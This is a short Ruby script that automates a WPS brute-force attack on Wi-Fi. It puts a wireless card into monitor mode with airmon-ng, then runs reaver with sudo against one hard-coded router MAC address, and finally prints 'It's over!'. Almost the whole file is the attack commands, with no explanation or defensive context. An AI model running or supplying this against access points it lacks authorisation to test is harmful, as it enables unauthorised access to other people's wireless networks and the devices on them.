require 'csv'
require './router.rb'

system("airmon-ng start wlan0")
system("sudo reaver -i mon0 -b 90:F6:52:63:96:12 -c 1 -f -vv -x 60")

system("clear")
puts "It's over!"


